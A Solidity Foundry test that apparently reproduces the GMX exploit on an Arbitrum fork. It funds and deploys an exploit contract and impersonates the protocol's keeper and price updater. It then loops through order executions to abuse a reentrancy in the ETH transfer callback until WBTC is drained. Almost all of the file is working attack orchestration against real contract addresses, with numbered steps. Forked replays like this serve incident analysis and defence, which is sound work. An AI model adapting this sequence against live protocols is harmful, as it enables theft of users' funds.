// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
import {IWETH9} from "../../interfaces/IWETH9.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IPositionManager} from "./IPositionManager.sol";
import {ExploitSC} from "./ExploitSC.sol";
import {IOrderBook} from "./IOrderBook.sol";

import {IFastPriceFeed} from "./IFastPriceFeed.sol";

//Contract deployed in arbitrum block 355876960
contract Exploit_GMX is TestHarness, TokenBalanceTracker{
    IERC20 internal constant USDC = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);

    IERC20 internal constant WBTC =
        IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);

    IWETH9 internal constant WETH =
        IWETH9(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);

    IERC20 internal constant USDCE =
        IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);

    IERC20 internal constant LINK =
        IERC20(0xf97f4df75117a78c1A5a0DBb814Af92458539FB4);

    IERC20 internal constant UNI =
        IERC20(0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0);

    IERC20 internal constant USDT =
        IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);

    IERC20 internal constant FRAX =
        IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);

    IERC20 internal constant DAI =
        IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);

    address internal constant UNISWAPV3_WBTC_USDC = 0x0E4831319A50228B9e450861297aB92dee15B44F;

    address internal constant KEEPER = 0xd4266F8F82F7405429EE18559e548979D49160F3;

    address internal constant UPDATER = 0x2BcD0d9Dde4bD69C516Af4eBd3fB7173e1FA12d0;

    ExploitSC internal exploitSC;

    IPositionManager internal constant POSITION_MANAGER = IPositionManager(0x75E42e6f01baf1D6022bEa862A28774a9f8a4A0C);

    IOrderBook internal constant ORDER_BOOK = IOrderBook(0x09f77E8A13De9a35a7231028187e9fD5DB8a2ACB);

    IFastPriceFeed internal constant FAST_PRICE_FEED = IFastPriceFeed(0x11D62807dAE812a0F1571243460Bf94325F43BB7);

    function setUp() external {
        cheat.createSelectFork("arbitrum", 355876959);

        // Deploy the exploit contract
        exploitSC = new ExploitSC();

        addTokenToTracker(address(USDC));
        addTokenToTracker(address(WBTC));
        addTokenToTracker(address(WETH));
        addTokenToTracker(address(USDCE));
        addTokenToTracker(address(LINK));
        addTokenToTracker(address(UNI));
        addTokenToTracker(address(USDT));
        addTokenToTracker(address(FRAX));
        addTokenToTracker(address(DAI));
        updateBalanceTracker(address(exploitSC));
        
        cheat.deal(address(this),0.8 ether);
        
        // This does not work. Probably need to update forge-std because token is behind a proxy
        //deal(address(USDC), address(this), 3001000000);
        vm.prank(UNISWAPV3_WBTC_USDC);
        USDC.transfer(address(this), 3001000000);
    }

    function test_attack() external {
       logBalancesWithLabel("Balance before exploit:", address(exploitSC));

        // 1. Transfer USDC to the exploit contract
        USDC.transfer(address(exploitSC), 3001000000);

        // 2. Attacker creates an order to long WBTC
        exploitSC.createIncreaseOrder{value: 0.2003 ether}();

        // 3. Keepr executes order
        vm.prank(KEEPER);
        POSITION_MANAGER.executeIncreaseOrder(
            address(exploitSC), 
            0, // order index
            payable(KEEPER)
        );

        // 4. Attacker creates a decrease order to withdraw funds from the previous position
        exploitSC.createDecreaseOrder{value: 0.0015 ether}();

        // Here wbtcBalance is used to determine when the exploit was completed. Multiple iterations of the loop are executed until required conditions are met
        uint256 wbtcBalance = WBTC.balanceOf(address(exploitSC));

        uint256 i = 0;
        while (wbtcBalance == 0){
            console2.log("Iteration", i);

            // 5. Keeper executes decrease order and triggers reentrancy in the eth transfer call. The exploit contract executes conditional logic depending on the state of the protocol. First iterations it will increase the position size, and create a decreasePosition. 
            // CHECK step 6 in ExploitSC.receive() to see how the reentrancy is exploited
            vm.prank(KEEPER);
            POSITION_MANAGER.executeDecreaseOrder(
                address(exploitSC), 
                i, 
                payable(KEEPER)
            );

            // 7. Updater updates price in the fast price feed
            // and triggers the execution of decrease position, generating a call to the gmxPositionCallback in the exploit contract that creates a new decrease position order that will be executed in the next iteration by the keeper
            // CHECK step 8 in ExploitSC.gmxPositionCallback() function
            vm.prank(UPDATER);
            FAST_PRICE_FEED.setPricesWithBitsAndExecute(
                650780127152856667663437440412910 + i,
                1752063940 + i,
                842256 + i,
                533458 + i,
                0,
                10001
            );

            wbtcBalance = WBTC.balanceOf(address(exploitSC));
            i++;
        }

        logBalancesWithLabel("Balance after exploit:", address(exploitSC));
    }
}